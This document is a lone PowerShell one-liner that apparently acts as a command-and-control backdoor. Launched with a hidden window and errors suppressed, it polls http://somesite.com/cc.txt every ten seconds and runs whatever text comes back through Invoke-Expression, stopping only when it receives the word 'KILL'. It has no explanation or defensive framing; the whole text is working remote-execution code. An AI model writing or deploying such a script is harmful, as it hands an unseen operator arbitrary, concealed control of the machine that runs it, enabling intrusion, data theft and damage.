powershell -windowstyle hidden {$ErrorActionPreference='silentlycontinue';$url='http://somesite.com/cc.txt'; $Interval = 10; $Killswitch = "KILL"; :looping while($true){    Write-Host "Getting command...";    $response = Invoke-WebRequest -Uri $url;    $Command = $response.Content;    if($Command.Trim() -ceq $Killswitch.Trim())    {        Write-Host "Kill command received, terminating...";         Exit     }    else    {        Write-Host "Command received: " $Command " - Executing...";         Invoke-Expression($Command)    ;         Write-Host "Command executed, going back to sleep.";         Start-Sleep -Second $Interval    }    } }
